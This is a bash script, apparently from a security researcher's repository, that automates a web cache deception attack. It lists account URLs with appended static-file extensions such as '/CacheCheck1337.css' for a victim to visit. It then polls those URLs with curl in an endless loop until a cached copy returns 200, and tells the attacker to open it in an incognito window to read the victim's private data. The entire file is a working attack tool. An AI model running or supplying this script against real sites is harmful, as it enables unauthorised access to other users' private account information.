#!/bin/bash

##### Web Cache Deception exploitation script ####
## coder: akrech				##
## github: https://github.com/akr3ch		##
## website: akr3ch.github.io			##
## twitter: a_k_r_e_c_H				##
##################################################

### colors codes ###
bold='\e[1m'
red='\e[31m'
green='\e[32m'
yellow='\e[33m'
blue='\e[34m'
none='\e[0m'

if [[ ${1} == '-h' || ${1} == '--help' ]];then
	### print the help menu ###
	echo -e "\n${bold}${blue}${0} --url ${yellow}https://test.example.com/myaccount${none}\n"
	echo -e "${green}Usage of the script too easy.Enter an url where unauthenticated users don't have any access and the script automatically sends requests to that endpoint until it gets a valid hit from that endpoint. All you need is the knowladge about web cache deception. What is web cache deception?"
	echo -e "${green}Web cache deception ${blue}(WCD) ${green}is an ${red}attack${none} ${green}where an ${red}attacker${none} ${green}tricks a caching proxy into erroneously storing private information transmitted over the Internet and subsequently gains unauthorized access to that cached data."
	exit 0
elif [[ ${1} == '-u' || ${1} == '--url' ]];then
	### take url input after before running ###
	url=${2}
	if [[ -z $url ]];then
        echo -e "${yellow}${bold}[${blue}-${yellow}] ${none}${red}Please enter an url." && exit 0
        fi
elif [[ -z ${1} ]];then
	### take url input after running ###
	echo -e "${green}${bold}[${red}+${green}] ${none}${blue}Enter url address ↔ (example: https://example.com/myaccount)"
	read -p "»» " url
	if [[ -z $url ]];then
	echo -e "${yellow}${bold}[${blue}-${yellow}] ${none}${red}Please enter a valid url." && exit 0
	fi
fi

### extentions name ###
extentions=(.js .css .jsp .asp .aspx .txt .html .htm .php5 .php4 .php3 .php .phtml .pdf .jpg .png .jpeg .svg .xml .gif)

### print possible exploitable url paths ###
for i in ${extentions[@]};do
	echo -e "${green}[`date '+%T'`] ${none}${blue}Navigate to ${yellow}${url}/CacheCheck1337${i}"
done


### main function ###
function main(){
while true;do
	for x in ${extentions[@]};do
		status=`curl -k --write-out "%{http_code}" --silent --output /dev/null "${url}/CacheCheck1337${x}"`
	if [[ $status == '200' ]];then
		echo -ne "\r${yellow}[`date '+%T'`]${none}${red} Cache data detected! ↔ extention used [${x}] \n"
		echo -e "${yellow}[`date '+%T'`]${none}${red} Open the url from private mode (Incognito window)"
		echo -e "${yellow}[`date '+%T'`]${none}${green} ${url}/CacheCheck1337${x}"
		false
	else
		echo -ne "\r${green}[`date '+%T'`] ${none}${blue}Waiting..."
	fi
	done
done
}

### run the main function ###
main
